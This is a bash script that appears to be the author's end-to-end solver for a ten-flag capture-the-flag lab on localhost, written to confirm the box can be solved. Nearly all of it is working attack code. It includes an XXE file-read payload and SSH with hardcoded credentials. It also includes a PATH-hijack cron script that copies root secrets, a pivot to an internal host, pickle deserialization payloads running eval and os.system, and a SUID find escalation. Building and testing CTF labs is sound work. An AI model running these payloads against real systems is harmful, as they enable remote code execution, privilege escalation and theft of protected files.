#!/bin/bash
# Automated end-to-end solver, used only to prove the box is solvable
# before publishing it. Requires: curl, sshpass, python3.
set -euo pipefail
cd "$(dirname "$0")/.."

HOST=localhost
WEB_PORT=8004
SSH_PORT=2204
CLERK_PASS="Cl3rk-Front2024!"

source .env
export CTF_SECRET

check() {
    local n="$1" got="$2"
    local want
    want=$(python3 -c "
import os, hmac, hashlib
secret = os.environ['CTF_SECRET']
d = hmac.new(secret.encode(), f'master-two-offices:$n'.encode(), hashlib.sha256).hexdigest()
print(f'HLC{{{d[:10]}}}')")
    if [ "$got" = "$want" ]; then
        echo "flag $n: OK ($got)"
    else
        echo "flag $n: MISMATCH got='$got' want='$want'" >&2
        exit 1
    fi
}

SSH() { sshpass -p "$CLERK_PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p "$SSH_PORT" clerk@"$HOST" "$@"; }

# 1
F1=$(curl -s "http://$HOST:$WEB_PORT/" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 1 "$F1"

# 2
F2=$(curl -s -d "username=branch_staff&password=branch2024" "http://$HOST:$WEB_PORT/login" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 2 "$F2"

# 3 (XXE)
F3=$(curl -s -X POST -H "Content-Type: application/xml" "http://$HOST:$WEB_PORT/import-schedule" --data-binary \
    '<?xml version="1.0"?><!DOCTYPE schedule [<!ENTITY xxe SYSTEM "file:///opt/frontdesk/secret/flag3.txt">]><schedule><name>&xxe;</name></schedule>' \
    | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 3 "$F3"

# 4 (XXE discloses SSH creds, then SSH in)
F4=$(SSH 'cat flag4.txt')
check 4 "$F4"

# 5 (PATH-hijack cron privesc)
SSH '
mkdir -p /tmp/loot
cat > /opt/admin/bin/backup-helper <<EOF
#!/bin/bash
cp /root/secret/* /tmp/loot/
chmod 644 /tmp/loot/*
EOF
chmod +x /opt/admin/bin/backup-helper
'
echo "Waiting up to 70s for the next cron tick..." >&2
for i in $(seq 1 70); do
    if SSH 'test -f /tmp/loot/flag5.txt' 2>/dev/null; then break; fi
    sleep 1
done
F5=$(SSH 'cat /tmp/loot/flag5.txt')
check 5 "$F5"
FRAG_A=$(SSH 'cat /tmp/loot/fragmentA.txt')

# 6 (recon on backoffice, reached by pivoting through the clerk SSH session)
F6=$(SSH 'curl -s http://backoffice:6000/' | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 6 "$F6"

# 7 (pickle deserialization RCE, via the same pivot: the exploit object's
# __reduce__ runs eval() on arbitrary code, whose return value becomes
# the pickle's "loaded" object -- reflected straight back in the response)
PAYLOAD7=$(python3 -c "
import pickle, base64
class E:
    def __reduce__(self):
        return (eval, (\"open('/opt/backoffice/secret/flag7.txt').read()\",))
print(base64.b64encode(pickle.dumps(E())).decode())
")
F7=$(SSH "curl -s -X POST --data-urlencode 'data=$PAYLOAD7' http://backoffice:6000/api/process" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 7 "$F7"

# 8 (same RCE, a different file)
PAYLOAD8=$(python3 -c "
import pickle, base64
class E:
    def __reduce__(self):
        return (eval, (\"open('/opt/backoffice/secret/flag8.txt').read()\",))
print(base64.b64encode(pickle.dumps(E())).decode())
")
F8=$(SSH "curl -s -X POST --data-urlencode 'data=$PAYLOAD8' http://backoffice:6000/api/process" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 8 "$F8"

# 9 + fragmentB (SUID find privesc, via the pivot)
PAYLOAD9=$(python3 -c "
import pickle, base64, os
cmd = r'find /root/secret/flag9.txt -exec cat {} /root/secret/fragmentB.txt \; > /tmp/root_loot.txt; chmod 644 /tmp/root_loot.txt'
class E:
    def __reduce__(self):
        return (os.system, (cmd,))
print(base64.b64encode(pickle.dumps(E())).decode())
")
SSH "curl -s -X POST --data-urlencode 'data=$PAYLOAD9' http://backoffice:6000/api/process" >/dev/null
PAYLOAD9b=$(python3 -c "
import pickle, base64
class E:
    def __reduce__(self):
        return (eval, (\"open('/tmp/root_loot.txt').read()\",))
print(base64.b64encode(pickle.dumps(E())).decode())
")
ROOT_LOOT=$(SSH "curl -s -X POST --data-urlencode 'data=$PAYLOAD9b' http://backoffice:6000/api/process")
F9=$(echo "$ROOT_LOOT" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 9 "$F9"
FRAG_B=$(echo "$ROOT_LOOT" | grep -oE '[a-f0-9]{20}' | tail -1)

# 10 (combine both fragments to decrypt final.enc)
curl -s "http://$HOST:$WEB_PORT/final.enc" -o /tmp/final.enc
F10=$(python3 docker/flagcrypto.py decrypt "${FRAG_A}${FRAG_B}" /tmp/final.enc -)
check 10 "$F10"
rm -f /tmp/final.enc

echo
echo "All 10 flags verified end-to-end."
